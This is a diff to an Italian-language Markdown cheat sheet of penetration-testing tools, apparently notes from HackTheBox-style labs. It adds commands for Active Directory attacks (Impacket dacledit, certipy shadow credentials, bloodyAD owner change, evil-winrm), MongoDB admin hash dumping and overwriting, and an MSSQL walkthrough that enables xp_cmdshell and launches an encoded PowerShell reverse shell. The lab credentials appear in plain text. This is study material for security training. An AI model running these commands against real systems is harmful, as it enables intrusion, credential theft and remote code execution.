@@ -18,12 +18,14 @@
 16. [Ddos](#dosddos-tools)
 17. [session hijacking](#session-hijacking)
 18. [web server and apps](#web-server-and-application)
-19. [wireless](#wireless-networks)
-20. [bluetooth](#bluetooth-attacks)
-21. [mobile](#mobile-hacking)
-22. [IoT](#iot-and-ot-hacking-tools)
-23. [Cloud](#cloud-computing-tools)
-24. [Metasploit](#metasploit-1)
+  - [SQL Injections](#sql-injection-tools)
+19. [Database](#database-exploitation)
+20. [wireless](#wireless-networks)
+21. [bluetooth](#bluetooth-attacks)
+22. [mobile](#mobile-hacking)
+23. [IoT](#iot-and-ot-hacking-tools)
+24. [Cloud](#cloud-computing-tools)
+25. [Metasploit](#metasploit-1)
 
 <br>
 <br>
@@ -46,6 +48,7 @@
 - [CyberChef](https://gchq.github.io/CyberChef/)
 - [pwninit](https://github.com/io12/pwninit?tab=readme-ov-file)
 - [One Gadget](https://github.com/david942j/one_gadget)
+- [NC for windows](https://github.com/int0x33/nc.exe/)
 
 <br>
 <br>
@@ -78,6 +81,7 @@
 - `reg query` - command to check for Registry entries
 - `at` - to find scheduled tasks
 - `pslogist` - to retrieve System and Security event logs
+- `Get-Localuser` - enumerate active users
 
 <br>
 <br>
@@ -456,6 +460,13 @@ tool per enumerare tutti gli utenti su una macchina e il loro SID da remoto -> s
 - snmpget / snmpwalk - LINUX
 - IP Network Browser - Graphical tool
 
+
+## Bloodhound-Python
+tool che fa enumeration su Active Directory per trovare possibili vie d'accesso.
+
+restituisce dei JSON con l'elenco di tutti i permessi per ogni utente, cartella, ecc...
+
+
 <br>
 <br>
 
@@ -537,23 +548,6 @@ permette remote code execution con username e password
 
 > psexec \\\\10.1.1.1 -u username -p password -s cmd.exe
 
-## MONGO DB
-se si trova la porta utilizzata da mongo, si può exploitare
-
-> mongo --port ... ace --eval "db.admin.find().forEach(printjson);"
->
-> dove:
->> --port si connette alla porta (il default è 27017)
->> ace è il db_address
->> --eval serve per valutare i json di risposta
-
-> db.admin.find().forEach(printjson);   -- stampa il json di ogni utente admin.
-> nel flag x_shadows c'è l'hash della password.
-
-Dopo aver trovato la pass dell'admin si può generare un hash dello stesso tipo con mkpasswd per poi sostituirlo con il comando:
-
-> mongo --port ... ace --eval 'db.admin.update({"_id":ObjectId("id_trovato_prima")}, {$set:{"x_shadow":"nuovo hash password"}})'
-
 ## PYTHON
 se python viene eseguito da root può essere sfruttato con librerie che accedono al sistema operativo
 
@@ -569,6 +563,25 @@ per usare la shell da python
 fuzzing tool for web sites:
 
 > ffuf -w [wordlist] -u [URL] -h hostname -fs ...
+
+## IMPACKET SUITE
+
+suite of tools preinstalled in kali linux
+
+- microsoft sql server tools
+- dacl editor to modify permissions on windows ACLs:
+  > impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAFXXXXXXXXXXX"
+- ...
+
+## EVIL-WINRM
+Tool per exploitare WINRM da remoto - KALI
+
+> evil-winrm -i 10.10.11.51 -u "user" -p "pass"
+
+## certipy-ad
+tool per ottenere NTHash e credenziali di un utente specifico (ca_svc nell'esempio) avendo l'accesso tramite un altro utente (ryan in questo caso)
+
+> certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
 
 
 <br>
@@ -676,6 +689,11 @@ command line tool. Example:
 - pwdump
 - Elcomsoft
 - LCP
+
+## bloodyAD 
+tool per accedere ad una AD da linux -> presente in kali
+
+> bloodyAD --host '10.10.XX.XX' -d 'escapetwo.htb' -u 'ryan' -p 'WqSZAF6XXXXXXXX' set owner 'ca_svc' 'ryan'
 
 <br>
 <br>
@@ -1263,6 +1281,68 @@ Tags:
 
 <br>
 <br>
+
+# DATABASE Exploitation
+
+## MONGO DB
+se si trova la porta utilizzata da mongo, si può exploitare
+
+> mongo --port ... ace --eval "db.admin.find().forEach(printjson);"
+>
+> dove:
+>> --port si connette alla porta (il default è 27017)
+>> ace è il db_address
+>> --eval serve per valutare i json di risposta
+
+> db.admin.find().forEach(printjson);   -- stampa il json di ogni utente admin.
+> nel flag x_shadows c'è l'hash della password.
+
+Dopo aver trovato la pass dell'admin si può generare un hash dello stesso tipo con mkpasswd per poi sostituirlo con il comando:
+
+> mongo --port ... ace --eval 'db.admin.update({"_id":ObjectId("id_trovato_prima")}, {$set:{"x_shadow":"nuovo hash password"}})'
+
+## MSSQL
+
+1. usa impacket-mssqlclient per entrare nel db. Per esempio:
+
+`impacket-mssqlclient escapetwo.htb/sa:MSSQLP@ssw0rd\!@10.10.11.51`
+
+2. ottieni i privilegi per eseguire comandi sulla shell
+
+```
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+```
+
+3. controlla i permessi
+
+```
+EXEC sp_configure 'xp_cmdshell'; 
+
+
+# DEVE COMPARIRE QUESTO
+name          minimum   maximum   config_value   run_value   
+-----------   -------   -------   ------------   ---------   
+xp_cmdshell         0         1              1           1  
+
+```
+
+4. usa comandi dalla shell di windows con `exec xp_cmdshell "comando"`
+
+5. scarica l'exploit e apriti una reverse shell tramite [questo link](https://github.com/Mayter/mssql-command-tool/releases/tag/mssql)
+
+`./mssql-command-tools_Linux_amd64 --host 10.10.xx.xx -u "sa" -p 'MSSQLP@ssw0rd!' -c "powershell -e yourbase64here"`
+
+
+
+<br>
+<br>
+
+-----
+
+<br>
+<br>
+
 
 # WIRELESS NETWORKS
 
